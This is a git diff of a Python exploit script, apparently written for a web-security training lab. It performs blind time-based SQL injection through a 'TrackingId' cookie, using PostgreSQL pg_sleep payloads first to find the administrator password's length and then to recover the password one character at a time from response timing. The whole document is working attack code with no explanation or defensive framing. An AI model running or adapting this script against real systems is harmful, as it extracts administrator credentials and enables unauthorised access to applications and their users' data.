@@ -5,14 +5,25 @@ from requests.adapters import HTTPAdapter, Retry
 
 
 
-def get_admin_password(url, session):
+def enumerate_password_length(url, session):
+    for i in range(1, 50):
+        payload = f"'|| (SELECT CASE WHEN (username='administrator' AND LENGTH(password)={i}) THEN pg_sleep(15) ELSE pg_sleep(0) END FROM users)--"
+        response = session.get(url, cookies={"TrackingId": payload}, timeout=25)
+        password_length = 0
+        if response.elapsed.total_seconds() > 15:
+            password_length = i
+            break
+    if password_length != 0:
+        return password_length
+
+
+def get_admin_password(url, session, password_length):
     alphanumeric_characters = string.ascii_lowercase + string.digits
     password = ""
-    print(f"(+) Enumerating Administrator password...")
-    for i in range(1, 21):
+    for i in range(1, password_length + 1):
         for j in alphanumeric_characters:
             payload = f"' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{i},1)='{j}') THEN pg_sleep(15) ELSE pg_sleep(0) END FROM users)--"
-            response = session.get(url, cookies={"TrackingId": payload})
+            response = session.get(url, cookies={"TrackingId": payload}, timeout=25)
             if response.elapsed.total_seconds() > 15:
                 password += j
                 print("\r" + password, end="", flush=True)
@@ -31,7 +42,16 @@ def main():
         url = sys.argv[1].rstrip("/")
         session = requests.Session()
         session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
-        get_admin_password(url, session)
+
+        print("(+) Enumerating password length...")
+        password_length = enumerate_password_length(url, session)
+        if not password_length:
+            print("(-) Something went wrong. Please check your URL and try again.")
+            sys.exit(1)
+
+        print(f"(+) Password Length: {password_length} characters ")
+        print(f"(+) Enumerating Administrator password...")
+        get_admin_password(url, session, password_length)
         print()
 
     except requests.exceptions.Timeout:
